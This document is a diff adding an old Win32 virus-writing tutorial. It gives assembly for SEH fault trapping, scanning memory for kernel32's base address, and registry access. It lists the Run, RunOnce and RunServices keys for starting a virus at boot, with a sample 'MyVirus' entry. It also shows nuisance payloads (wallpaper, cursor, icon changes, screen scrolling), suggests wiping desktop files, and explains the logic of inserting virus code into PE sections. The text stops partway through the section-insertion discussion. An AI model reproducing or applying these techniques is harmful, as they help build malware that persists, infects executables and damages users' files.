@@ -1,0 +1,981 @@
+  __________________________________________________________________________
+ (__________________________________________________________________________)
+ { __ }   { __ }        |                            |        { __ }   { __ }
+  |\\|     |\\|    .----O----------------------------O----.    |//|     |//|
+  |\\|     |\\|    |      Win32 programming addendum      |    |//|     |//|
+  |\\|     |\\|    `--------------------------------------'    |//|     |//|
+ {____}   {____}                                              {____}   {____}
+
+
+      _____________
+     /            (
+    (   Foreword   )
+     )____________/
+
+        Hello!  It  has been 11 months since I first started looking over the
+ win32  programming  (could have a kid by now ;-)). I released three articles
+ related  to the win32 programming until now: Locating the WinAPIs using file
+ imports,  Appending  to  the PE file and Win95/98 residency. During all this
+ time  my  entire attention was moved towards win32 programming, the only old
+ dos programming  release of mine being the Smart Article Reader. In these 11
+ months all I did was buy and read books, download tons of documents from the
+ net,  discussing  on  IRC,  e-mail  knowledge  exchange,  source code study,
+ samples  study  and thousands and thousands of hours of trying, experiencing
+ and... a lot of cursing, of course ;-) By doing this I feel my knowledge has
+ grown at least a little bit so now I can say I have a real grip on the win32
+ programming.  I  also  cannot  say  that  I  discovered myself most of these
+ things.  Of  course not. My only contribution was to understand those things
+ as  good  as  possible,  try them out, and then explain them in an easier to
+ understand  way.  That  is  a  part  of what I am going to do in this little
+ article.  I  couldn't  give a name to this because here you will encounter a
+ lot  of  things  that  I  came  aware  of in the last 9 months, some of them
+ presented  only partialy in my other articles, some of them not presented at
+ all,  and,  yes,  some of them presented wrong. Here I will try to guide you
+ into a small journey on the win32 system on the x86 machine. By saying win32
+ you  have  to  understand  that  I  mean  a  x86  machine running one of the
+ following   operating   systems:   Windows95,   Windows95-OSR2,   Windows98,
+ WindowsNT.
+
+        Also,  you  will find in this article, as well as in my last codings,
+ refferences  to  some structures. I will not define those structures in this
+ article.  You  can  understand them by name using a chart of the PE file, or
+ you  can look them up on my web page (check end of article) in the win32_lj.
+ zip  file,  which contains my transformation of the original Win SDK include
+ files. Very useful and easy to use...
+
+        I  would like to take a moment and thank all the people who guided me
+ inside the win32 world and to hope that maybe one day I will be able to give
+ my help back to them:
+
+        JackyQwerty, Murkry, B0z0, Z0mbie, Shaitan, BlueSkull
+
+        Now, let's start... Fasten your seat belts!! I mean it ;-))
+
+      _________________________________
+     /                                 (
+    (   Setting a temporary SEH frame   )
+     )_________________________________/
+
+        The  SEH  (Structured  Exception  Handling) is a very powerful little
+ thing  that  Microsoft tried to hide for a while, but eventually it all came
+ out the surface.
+
+        You  know  how  win32  runs  in  protected mode. And you know that in
+ p-mode  you  have some attributes for the memory pages. Attributes like page
+ is  writable,  page  is  readable, etc... So, whenever some piece of code is
+ trying  to take an action over a page that is against the attributes of that
+ particular page, an exception error will occure. This is the moment when the
+ win32  system  jumps  into  it's  SEH  frame.  The  original win32 SEH frame
+ displays  a  window  in  which it notifies you about the error and gives you
+ different   details  like  the state of the registers when the error occured
+ and  the EIP where it happened. It's the well known message box that has the
+ 'close'  button and which says stuff like "Program generated a page fault at
+ address...".
+
+        When  you  write  win32  programs and you are running on not so solid
+ ground  (as  you  will see in the next chapter) your code could fall into an
+ exception  error  and,  of course, you don't want such thing to happen. What
+ you  want  is  to  trap  the exception error if it happens and continue into
+ another point not letting the user notice that it happend.
+
+        The  original  SEH  pointer  can  be found at FS:[0] when the program
+ starts.  You  may  modify  the  SEH pointer to point to your own routinevery
+ easy, like this:
+
+        lea eax, MyHandler
+        push eax
+        push fs:[0]
+        mov fs:[0], esp
+
+        The stack will look like this:
+
+            ESP-4   offset MyHandler
+            ESP     offset OldHandler
+
+        and FS:[0] will be equal to ESP.
+
+        Now  I  know  it looks a little peculiar: the SEH frame points to the
+ old  handler (thru ESP) but actually the dword above on the stack will point
+ to the original SEH frame.
+
+        Let's look at the entire way to code a temporary SEH frame:
+
+        pushad                             ; save all registers
+        lea eax, ExceptionHandler          ; get our handler offset
+        push eax                           ; set our handler
+        push fs:[0]                        ; save old handler
+        mov fs:[0], esp                    ; enable our handler
+                                           ;
+        (code that could cause an error)   ; here is your code
+                                           ;
+        jmp restoreSEH                     ;
+                                           ;
+ ExceptionHandler:                         ; we come here if an error
+        mov esp, [esp+8]                   ; occured; restore ESP
+                                           ;
+ restoreSEH:                               ; restore SEH frame
+        pop fs:[0]                         ; to it's old value
+        add esp, 4                         ; restore stack
+        popad                              ; restore registers
+
+        As  you  saw,  I save and restore the registers. This is done because
+ when   the   SEH  handler  is called all registers receive different values.
+ I  will not discuss those values here. All you need to know is that at ESP+8
+ you find the ESP before the error and you need to restore it.
+
+        You  may  have  no  matter how many SEH handlers one above the other,
+ just  don't  forget  to  restore  the  original SEH. In my opinion, the best
+ solution  is  to  set up a SEH frame that points to the return to host part.
+ This  would  be the general SEH. If any error happens your virus will abort.
+ Then, whenever you need to run some code which you are not very sure on, set
+ up  a  new temporary SEH frame like I explained above. You could also set up
+ an internal flag (like set CF if the error happend).
+
+        Let's  take a look at a brief and useful application of the temporary
+ SEH frame.
+
+
+      __________________________
+     /                         (
+    (   Locating the Kernel32   )
+     )_________________________/
+
+        Locating  the  kernel32 base address is the most important thing when
+ running  the  win32  virus.  This  because  the kernel32 provides us all the
+ needed  APIs  to  use.  You  probably  are  already familiar with the way of
+ getting  the  kernel32  I  presented in my earlier documents, using the file
+ import  table (I will discuss that again later). Here I will present however
+ another   method.  This  method  seems  to  work  just  fine  in  all  win32
+ environments.  I  saw  this  method  for  the  first time in Virogen's virus
+ Enumero.  The basic assumption behind this one is that the kernel32 loads at
+ a  fix address. For now this is true for Win9x, but not for WinNT. For WinNT
+ it  is  uncertain  if  the  kernel  loads at a fix address. For now, the fix
+ address  for  win9x  is  0BFF70000h  and  for WinNT it's 07FFF0000h. This is
+ actually  the base address where the kernel loads, the base address which we
+ need  to  find out. Knowing the PE file internal structure, you know that at
+ offset 0B4h starting from the very beginning you have the value of the image
+ base  field,  actually  the  base  address where the file gets loaded at run
+ time. This is the field where the kernel32 keeps it's base address and there
+ we shall look for it.
+
+        Whenver  a  win32  program  is  loaded by the system, the dword which
+ exists  on  the  stack  represents  a pointer inside the Kernel32 body, thus
+ above it's image base. We will start looking from that address downwards the
+ memory  until  we  find  what  we  need, until we find that the dword at the
+ address  plus  0B4h  is  the  same as the address itself. Let's see the code
+ below:
+
+        (here I assume no change was made to the stack since the
+        start of the programm)
+
+        pushad                             ; save all registers
+        lea eax, ErrorExit                 ; first set up a temporary
+        push eax                           ; SEH handler
+        push fs:[0]                        ;
+        mov fs:[0], esp                    ;
+                                           ;
+        mov eax, dword ptr [esp+8+20h]     ; take off the stack the dword.
+                                           ; (8=SEH pointers, 20h=pushad)
+ locate_k32_loop:                          ;
+        cmp dword ptr [eax+0b4h], eax      ;
+        je k32_found                       ;
+        dec eax                            ;
+        jmp locate_k32_loop                ;
+                                           ;
+ k32_found:                                ;
+        mov edx, eax                       ;
+        jmp restoreSEH                     ;
+                                           ;
+ ErrorExit:                                ; we come here if an error
+        mov esp, [esp+8]                   ; occured; restore ESP
+        xor edx, edx                       ;
+                                           ;
+ restoreSEH:                               ; restore SEH frame
+        pop fs:[0]                         ; to it's old value
+        add esp, 4                         ; restore stack
+        popad                              ; restore registers
+
+
+       So, the above code we'll exit after the popad with EDX=0 if the search
+ failed  or  EDX= kernel32 address if the search was successful. You probably
+ ask  yourself why I do not make a check in the main search loop, which looks
+ like  an  endless loop if [eax+0b4h] will never be equal to eax. That is not
+ correct, because if eax continues to decrease, eventually it will reach into
+ a read protected page and trying to compare the dword at eax+0b4h will cause
+ a  page read fault which will activate our SEH handler exiting thus from the
+ loop and into the ErrorExit address, where EDX gets zeroed.
+
+        This  is  a  very effective, quick and simple method. If it fails you
+ can jump to a import table method.
+
+
+       ______________________
+      /                     (
+     (  Using the Registry   )
+      )_____________________/
+
+      The  Registry  is  a very important area where our code can store data.
+ Usually  the  Registry  isn't good for holding big amounts of data (like the
+ entire virus body or something like that). Instead, you can use the Registry
+ to store important values for your code. For example, in one of my viruses I
+ used  the Registry to store the temporary path until where the virus scanned
+ the  hdd.  Everytime  the virus was ran again, it looked in the Registry and
+ started  the scanning from where it left it. There are many important things
+ about  the  Registry that we will speak of later. First let's concentrate on
+ the Registry layout and the ways of accessing it.
+
+        Firstly  let  me  tell  you  that even from the times of the good old
+ Win3.11  there existed an application called Regedit. This application still
+ exists  in  the  win32  systems. It's use is the editing of the registry, as
+ it's name suggests. For Win95 and NT there appeared more sophisticated tools
+ for  faster  Registry access, like the ones included in the Norton Utilities
+ for  Win  package. Anyway, for our test the only tool you will be needing is
+ the  Microsoft  Regedit which gets installed together with any copy of Win95
+ or WinNT.
+
+
+        Registry Basics
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        The  registry  is  a  database  where Windows important configuration
+ information  is stored under the Win32 system. It is a farily new idea which
+ replaces all the .INI files you were familiar with in the Windows3.x system.
+ This is much better, having all the info in the same place, I mean, and also
+ the accessing system is much more improved.
+
+        The  Registry  looks  more  or  less  like a hard-disk structure. The
+ Regedit  program  shows  the registry almost like the Windows Explorer shows
+ the  hard  disk structure. Knowing the structure of the disk you can imagine
+ how the registry looks thinking at the following relations:
+
+        folder = key
+        file   = value
+
+        As  the  folders  on  hdd  can  contain  subfolders,  the keys in the
+ registry can have their subkeys. Here is an example on the registry:
+
+           ÚÄÄÄÄÄÄÄÄÄÄ¿
+           ³ Root key ³
+           ÀÄÄÂÄÄÄÄÄÄÄÙ
+    ùùùÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄ¿
+           ÚÄÄvÄÄÄÄÄÄÄ¿ ÚÄÄÄÄvÄÄÄÄÄ¿ ÚÄÄÄÄvÄÄÄÄÄ¿ ÚÄÄÄÄvÄÄÄÄÄ¿
+           ³ Value    ³ ³ Subkey1  ³ ³ Subkey2  ³ ³ Subkey3  ³
+           ÀÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÂÄÄÄÄÄÙ ÀÄÄÄÄÂÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄÙ
+                             ³            ³
+                        ÚÄÄÄÄvÄÄÄÄÄ¿ ÚÄÄÄÄvÄÄÄÄÄ¿
+                        ³ Value    ³ ³ Value    ³
+                        ÀÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÂÄÄÄÄÄÙ
+                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                        ÚÄÄÄÄvÄÄÄÄÄ¿ ÚÄÄÄÄvÄÄÄÄÄ¿ ÚÄÄÄÄÄvÄÄÄÄ¿
+                        ³ Value1   ³ ³ Value2   ³ ³ Subkey4  ÃÄÄùùù
+                        ÀÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄÙ
+
+
+        The  configuration  of  one  application is made of a set of keys and
+ values.  So, you understand how important is this area for storing our data.
+ Let's see some more on the specific layout of the Registry.
+
+        Windows95/98  and  NT have the same root of registry and it goes like
+ this:
+
+       [-]Ä-ş My Computer
+            ³
+           [+]-ş HKEY_CLASSES_ROOT
+           [+]-ş HKEY_CURRENT_USER
+           [+]-ş HKEY_LOCAL_MACHINE
+           [+]-ş HKEY_USERS
+           [+]-ş HKEY_CURRENT_CONFIG
+           [+]-ş HKEY_DYN_DATA
+
+        Each  branch  has it's own purpose and it's own relationship with the
+ others:
+
+ HKEY_CLASSES_ROOT:  This  is  actually  a  part of HKEY_LOCAL_MACHINE and it
+ contains  definitions  of  document  types, file associations, and the shell
+ interface.  The  info  here  is  almost  like  the  info  in  the Windows3.x
+ Regtistry.
+
+ HKEY_CURRENT_USER:  This  is  a  link  from  HKEY_USERS  and it contains the
+ specific  settings  of  the  current user. The users that run on the default
+ system have the configuration from the .DEFAULT.
+
+ HKEY_LOCAL_MACHINE:  Here  we  have  the hardware configuration, the network
+ protocols and software classes (HKEY_CLASSES_ROOT)
+
+ HKEY_USERS: This is used to store the preferences for each user.
+
+ HKEY_CURRENT_CONFIG:  This  is  a link of the display subkey of the selected
+ configuration  of  the config subkey of the root HKEY_LOCAL_MACHINE. It will
+ only be used in cases of multiple hardware configurations.
+
+ HKEY_DYN_DATA:  The 'Enum' subkey holds the hardware data for each component
+ of the system. The 'PerfStats' subkey measures system performance. This data
+ is  only  generated  when  a  call  to  RegQweryKeyEx  is  called  with  the
+ HKEY_PERFORMANCE_DATA value (we shall discuss this later).
+
+        For  us,  the  most easy to use would be the first class, in which we
+ can store the data we need. How to do that? Read furthure...
+
+
+        Registry related APIs
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        Briefly,  here  are  the  Apis  that  have  something  to do with the
+ registry. They all can be found in the ADVAPI32.DLL, so one must locate them
+ separately from the other apis:
+
+        RegCloseKey             - Closes an open registry key
+        RegConnectRegistry      - Connects to a predefined registry handle
+                                  on another computer
+        RegCreateKeyEx          - Creates a new subkey
+        RegDeleteKey            - Removes a key from the registry
+        RegDeleteValue          - Removes a value from a registry key
+        RegEnumKeyEx            - Enumerates throught the subkeys of a key
+        RegEnumValue            - Enumerates through the values of a key
+        RegFlushKey             - Writes registry changes to disk
+        RegLoadKey              - Loads a hive into a topmost root key
+        RegNotifyKeyChangeValue - Indicates when a registry key or value
+                                  changes
+        RegOpenKeyEx            - Opens an existing registry key
+        RegQueryInfoKey         - Returns information about a key
+        RegQueryMultipleValues  - Returns the type and data for a list of
+                                  value names
+        RegQueryValueEx         - Returns a value
+        RegReplaceKey           - Replaces a key with the contents of a file
+                                  when the system is restarted
+        RegRestoreKey           - Reads a hive into a previously stored key
+        RegSaveKey              - Saves values and subkeys of subkey to a
+                                  hive file
+        RegSetValueEx           - Assigns a value to a key
+        RegUnLoadKey            - Removes a hive from the registry
+
+
+        Let's  see  furthure,  how  can  we  use  the  apis  which are really
+ interesting to us:
+
+
+        Registry create/open/set/query example
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        First  of  all,  let  me  say  that  just  like  many other apis, the
+ RegCreateKeyEx  not  only  creates  keys,  but  it  also opens them, if they
+ already exist.
+
+        Creating/opening a key:
+        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+        push offset disposition
+        push offset key_handle
+        push 0
+        push dword <access option>
+        push dword <options>
+        push offset class
+        push 0
+        push offset subkey
+        push offset key
+        call RegCreateKeyEx
+
+ disposition  -  it's  a dword that receives a value indicating if the subkey
+ was   created  (REG_CREATED_NEW_KEY)  or  if  an  existing  key  was  opened
+ (RTEG_OPENED_EXISTING_KEY)
+
+ key_handle  -  is  a  dword  that  receives the handle of the created/opened
+ subkey
+
+ <access  options>  -  is a dword that specifies the type of access (the most
+ used is the KEY_ALL_ACCESS value)
+
+ <options> - is a dword value that specifies if the key is volatile (detroyed
+ at boot) or non-volatile (permanent)
+
+ class - is a string with the name of the class of the key.
+
+ subkey  -  is  a string containing the name of the new subkey. If it already
+ exists, it is opened.
+
+ key  -  the key under which the new subkey is to be created. This may be any
+ open key or one of the root keys (HKEY_CLASSES_ROOT, etc...)
+
+        Closing a key:
+        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+        push handle
+        call RegCloseKey
+
+        Querying a key:
+        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+        push offset data
+        push offset bdata
+        push offset type
+        push 0
+        push offset value_name
+        push offset subkey
+        push key
+        call RegQueryValueEx
+
+ data  -  a  pointer  to  a  dword variable that contains the number of bytes
+ available in the bdata buffer.
+
+ bdata - the pointer to a buffer that receives the query
+
+ type - the type of the queried value (string, word, etc...)
+
+ value_name - a pointer to the name of the value to be read
+
+ subkey - a pointer to the name of the key to be queried
+
+ key - the registry key that holds the queried subkey.
+
+ ÄÄÄÄÄ>  And now, an example:
+
+ ; creating a key in the HKEY_CURRENT_USER
+
+       lea eax, dword ptr [ebp+offset key_handle]   ; First let us open
+       push eax                                     ; the key we have
+       push KEY_ALL_ACCESS                          ; our value set up in
+       push 0                                       ;
+       lea eax, dword ptr [ebp+offset KEY]          ;
+       push eax                                     ;
+       push HKEY_CURRENT_USER                       ;
+       call [ebp+_RegOpenKeyExA]                    ;
+       cmp eax, 0                                   ;
+       jne set_new_key                              ; if error -> create...
+
+; Querying the key value:
+
+       lea eax, dword ptr [ebp+offset key_len]      ; now, after the key is
+       push eax                                     ; open, lets query our
+       lea eax, dword ptr [ebp+offset key_data]     ; value
+       push eax                                     ;
+       lea eax, dword ptr [ebp+offset key_type]     ;
+       push eax                                     ;
+       push 0                                       ;
+       lea eax, dword ptr [ebp+key_name]            ;
+       push eax                                     ;
+       mov eax, dword ptr [ebp+key_handle]          ;
+       push eax                                     ;
+       call [ebp+_RegQueryValueExA]                 ;
+       cmp eax, 0                                   ; if found, then it's ok
+       je key_was_found                             ;
+
+; Closing the key:
+
+       mov eax, dword ptr [ebp+key_handle]          ; close key handle
+       push eax                                     ; (carefull!)
+       call [ebp+_CloseHandle]                      ;
+
+; Creating a NEW key:
+
+set_new_key:                                        ; otherwise create key/val
+       lea eax, dword ptr [ebp+disposition]         ; new? or existing?
+       push eax                                     ;
+       lea eax, dword ptr [ebp+key_handle]          ; new key handle
+       push eax                                     ;
+       push 0                                       ; security attrib
+       push KEY_ALL_ACCESS                          ; all access
+       push REG_OPTION_NONVOLATILE                  ; don't destroy at reboot
+       push 0                                       ; class
+       push 0                                       ; reserved
+       lea eax, dword ptr [ebp+KEY]                 ; ptr to new key name
+       push eax                                     ;
+       push HKEY_CURRENT_USER                       ; parent key
+       call [ebp+_RegCreateKeyExA]                  ;
+
+; Create the new key value:
+
+       push 4                                       ; new value length
+       lea eax, dword ptr [ebp+key_value]           ; new value pointer
+       push eax                                     ;
+       push REG_SZ                                  ; make it string
+       push 0                                       ; reserved
+       lea eax, dword ptr [ebp+key_name]            ; key name for value
+       push eax                                     ;
+       mov eax, dword ptr [ebp+key_handle]          ;
+       push eax                                     ; new key handle
+       call [ebp+_RegSetValueExA]                   ;
+                                                    ;
+key_was_found:
+       mov eax, dword ptr [ebp+key_handle]          ; close this handle too
+       push eax                                     ;
+       call dword ptr [ebp+_CloseHandle]            ;
+
+
+        The used variables in this example follow here:
+
+ HKEY_CURRENT_USER      EQU 80000001h                ; Where to create key
+ REG_SZ                 EQU 1                        ; Create String values
+ REG_OPTION_NONVOLATILE EQU 0                        ; Do not destroy at reboot
+ KEY_ALL_ACCESS         EQU 0F003FH                  ; all access
+ disposition dd 0                                    ; ...
+ key_handle  dd 0                                    ; values ret. by Create
+ KEY         db "Control Panel\Cursors", 0           ; new key
+ key_data    db 260 dup(0)                           ; new value
+ key_len     dd 260                                  ;
+ key_name    db "newkey", 0                          ; key name
+ key_type    dd 0                                    ;
+ key_value   db "newvalue", 0                        ;
+
+        The  example  above will try to locate a key by the name "newkey" and
+ if  it  is  not  found  will  attempt  to  create  it  and give it the value
+ "newvalue". Pretty simple...
+
+
+        Interesting Registry keys
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        For  virus  writing there are some interesting registry keys which we
+ can  consider.  The most important are those that allow us to run a specific
+ file at boot time. Here are the keys:
+
+ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Run
+ HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
+ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+
+        You  can  set  up a new name and value in one, or each of these keys,
+ something like:
+
+        MyVirus         "C:\Windows\System\myvirus.exe",0
+
+        The  registry  has  much too offer and you should check it carefully.
+ This  is  just a small start... For the rest of the apis study the Microsoft
+ api refference.
+
+
+       ____________________
+      /                   (
+     (  Graphical thigies  )
+      )___________________/
+
+        Ok,  I  am not going to run too deep in this part because here is the
+ place  where  each  one  must  use  his  own  imagination to design the most
+ interesting  graphical  payloads.  For  the  windows  viruses  the graphical
+ payload  is  a  must have... I will only describe here some common graphical
+ things  you  can  do in Win95 or WinNT. From there on it is your imagination
+ that  comes in action. If you think of any interesting graphical stuff to do
+ in  the  win32  systems  and you feel like sharing it, please drop me a note
+ too. So, let's go:
+
+
+        Displaying a Message Box
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        This  is  probably the very first thing anybody learned in win32. Let
+ me just brief it:
+
+        push <button style>
+        push <offset to window title string>
+        push <offset to window content string>
+        push 0
+        call MessageBoxA
+
+        The  button styles can be found in the include files, and the content
+ string may contain the characters 0Ah, 0Dh to obtain a CR/LF.
+
+
+        Changing the cursor
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        The cursor shapes are held in this registry directory:
+
+        HKEY_CURRENT_USER\Control Panel\Cursors
+
+        The name of the key we are interested in is: "Arrow"
+
+        So,  in  order  to  change  the cursor, create an .ico file using any
+ drawing  utility and then include it in your code as DB's. Then at the right
+ moment,  drop  it  to  disk  as  a  new file somewhere called something like
+ newico.ico, or whatever. Then open the above key and change the value of the
+ "Arrow" key to:
+
+        "<path to file>\newico.ico"
+
+        The  next time the computer gets reboot, the new default icon will be
+ the newico.ico one.
+
+
+        Changing the background
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        Changing  the  background  implies  like  in  mouse pointer a premade
+ Windows  style  BMP which you need to dump to disk under a certain name in a
+ certain directory. Then, to activate it you need to do the following:
+
+        First let's open the key: HKEY_CURRENT_USER\Control Panel\Desktop
+
+        lea eax, [ebp+offset key]    ; handle for the opened key
+        push eax                     ;
+        push KEY_SET_VALUE           ; Security access mask
+        push 0                       ; Reserved
+        lea eax, [ebp+offset subkey] ; Address of name of subkey to open
+        push eax                     ;
+        push HKEY_CURRENT_USER       ; Handle of root key
+        call [ebp+_RegOpenKeyExA]    ; open it!
+
+        Now  let's set the TileWallpaper style (check the definitions below).
+ If  you  want the bmp to be tilled on the screen set this to 1, otherwise to
+ 0.  Because  the  virus  cannot usually have big graphical data inside it is
+ used  to have small bmp's tilled on the screen. This is like in this example
+ where we set the "TileWallpaper" to 1:
+
+        push 2h                      ; Size of value data
+        lea eax,[ebp+offset twp_data]; Address of value data
+        push eax                     ;
+        push REG_SZ                  ; Value data is string
+        push 0                       ; Reserved
+        lea eax, [ebp+offset twp_string]; Address of value to set
+        push eax                     ;
+        push dword ptr [ebp+offset key]; Handle of key to set value for
+        call [ebp+_RegSetValueExA]   ;
+
+        Then we set the WallpaperStyle value in the registry:
+
+        push 2h                      ; Size of value data
+        lea eax, [ebp+offset wps_data]; Address of value data
+        push eax                     ;
+        push REG_SZ                  ; Value data is string
+        push 0                       ; Reserved (?)
+        lea eax, [ebp+offset wps_string]; Address of value to set
+        push eax                     ;
+        push dword ptr [ebp+offset key]; Handle of key to set value for
+        call [ebp+_RegSetValueExA]   ;
+
+        And  now  let's  use all the stuff above and activate the new desktop
+ wallpaper  by  calling  the  SystemParametersInfo  Api with the SetWallpaper
+ flag:
+
+        push 0                       ; User profile update flag
+        lea eax, [ebp+offset wallpaper]; ASCIIZ filename of .BMP file
+        push eax                     ;
+        push 0                       ; Reserved
+        push SPI_SETDESKWALLPAPER    ; System parameter to set
+        call [ebp+_SystemParametersInfoA]; Address of API to call
+
+        And how our data definition looks like:
+
+        subkey      db "Control Panel\Desktop", 0
+        key         dd 0
+        twp_data    db "1", 0
+        wps_data    db "0", 0
+        twp_string  db "TileWallpaper", 0
+        wps_string  db "WallpaperStyle", 0
+        wallpaper   db "FILE.BMP", 0       ; this is the file we dumped...
+
+
+        Changing the desktop icons
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        I will not enter the details here, because the layout of the LNK file
+ is  not  to be explained in this article. Anyway, get the layout of the .LNK
+ file   from   www.wotsit.org   and   after   that   look   in  the  <Windows
+ directory>\Desktop for lnk files and replace the icon data within.
+
+
+        Changing the desktop icon's names
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        This is very, very easy. Just make a procedure to look for .LNK files
+ in  the <Windows directory>\Desktop. Simply rename each file to whatever you
+ want  and  the change will be notticed imediately and updated on the screen.
+ This  can be really annoying if combined with a change of the desktop icon's
+ picture... Another cool payload would be to wipe all those files >:-)
+
+
+        Displaying bmps on the screen
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        In  order  to  do  that,  one must first load an image. I will take a
+ simpler example here. Let us display some icons on the screen. First we must
+ load the icon:
+
+        push <icon>
+        push 0
+        call LoadIcon
+        mov [iconhandle], eax
+
+        Then we get the device context:
+
+        push 0
+        call GetDC
+        mov [dchandle], eax
+
+        Then we display the icon:
+
+        push iconhandle
+        push X
+        push Y
+        push dchandle
+        call DrawIcon
+
+        The  <icon>  value  can  be one of the predefined Windows icons, like
+ IDI_APPLICATION,  IDI_ASTERISK,  etc... The X and the Y are the positions on
+ the screen.
+
+
+        Moving the Windows desktop
+        ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+        In  order to move the Windows desktop the actual action to take is to
+ simply  pick  up pieces of the rectangle that represents the screen and move
+ it  someplace  else.  This  is  done using the BitBlt api and you can obtain
+ really interesting efects with it (like the puzzle made from the screen).
+
+
+        First  we  must  obtain a handle for the device context. This is done
+ like this:
+
+        push 0
+        Call GetDC
+        mov [dchandle], eax
+
+        Then,  let's assume we want to move the Windows desktop downwards. We
+ must  make  a  loop  and  at  each iteration we must copy the entire Windows
+ screen  on  line  below.  This  is almost like the payload from the Doomsday
+ virus by Blue Skull:
+
+        mov cx, 800h
+ loop_:
+        push  00CC0020h     ; Flag to obtain the copy
+        push  0             ; X value for source rectangle
+        push  0             ; Y value for source rectangle
+        push  [dchandle]    ; Device context for the rectangle to move
+        push  800h          ; rectangle width
+        push  800h          ; rectangle height
+        push  1             ; X value for the destination rectangle
+        push  0             ; Y value for the destination rectangle
+        push  [dchandle]    ; Device context for the destination area
+        Call  BitBlt        ;
+        loop loop_          ;
+
+
+
+        This  was a small idea on what you can do in a very small code in the
+ win32 system. As I said, it is only a start, the first things that came into
+ my mind. Build from here your own nice graphical payloads. Good luck!
+
+
+       ____________________
+      /                   (
+     (  Section insertion  )
+      )___________________/
+
+        The  first thing when it comes to infecting files is appending to the
+ end  of  file.  This  was  common  to  DOS infection, it was common to win32
+ viruses  also.  However,  the  DOS inserters appeared pretty quickly, and so
+ should  win32 viruses. I am preety proud about creating one of the first, if
+ not  the  first working PE inserter (DROL). However, as more complicated the
+ infection  gets, more problems appear. This happened to me while writing the
+ Drol virus. Firstly I wanted to make a virus to insert itself between any of
+ the  sections  inside  the  PE  file. I found out soon enough that it is not
+ possible.  Why?  I  shall explain in a minute, but before let me thank Jacky
+ Qwerty  for  throwing  some  light  over this stuff and explaining to me the
+ basis around RVAs. Thanx, JQ!
+
+
+        When you write down your code, seldomly you write stuff like mov eax,
+ [<address>].  When the compiler assembles the code, the <address> address is
+ expressed  like  a  RVA, meaning it depends on whether the file loads at the
+ default imagebase or not. If the file doesn't load at the default imagebase,
+ the  <address>  must  be rearranged, because it doesn't point anymore to the
+ right  data.  This  is  when  the loader looks up to the relocation section.
+ There,  for  each address like our <address> here you have it's place inside
+ the  PE file. Thus the loader looks up and increases or decreases each value
+ found  in  the  relocations using the delta given  by the difference between
+ the  default  imagebase  and the actual imagebase. In this way, the file may
+ actually load anyware, because the relocations take care of the addresses.
+
+        This  logic  doesn't  apply only to the addresses like the one above.
+ Let's  think  for  example  at  the  resources. When the file is linked, the
+ resources  (which  have  a  strange  layout)  point to some data (like bmps,
+ icons,  menus,  etc...).  Once  the file loads at a different imagebase, the
+ pointers no longer point to the right data.
+
+        The  second  part  of  this  disertation  is that the relocations are
+ obsolete.  To  prove  that I will ask you to dump the PE header of the files
+ inside the Microsoft Office and notice that they don't have relocations. The
+ reason  for  that  is easy to see. The PE file is always the first one to be
+ mapped  in  the  new process area, therefore the entire memory is his memory
+ and  it  can be safely placed at the imagebase in it's header. After it come
+ the linked DLL's and other stuff. Basically the PE file can always be loaded
+ at it's imagebase and this is a rule.
+
+        We  are slowly coming to what I wanted to prove to you. Let's look at
+ it:  relocations  are obsolete, therefore they may not appear in the PE file
+ or  they  may  be wrong; without relocations you cannot load the sections of
+ the  PE  file somewhere else than where they were supposed to be... Starting
+ to understand?
+
+        If  you insert your code between two sections of the PE file, all the
+ sections  below  will  be moved downwards with the virus size. Therefore, at
+ load time, all pointers will point with virus size more than normal. Meaning
+ that  in  order  to have them point to the right locations we must rearrange
+ all  the  RVA's  in the sections following the virus by increasing them with
+ the RVA delta brought by the virus.
+
+        Using  relocations  we  could  do  that.  The  virus  could parse the
+ relocations  and  relocate all the RVAs in the sections following the virus.
+ But,  as  I  said,  the  relocations  may not exist or may be wrong. So this
+ solution drops.
+
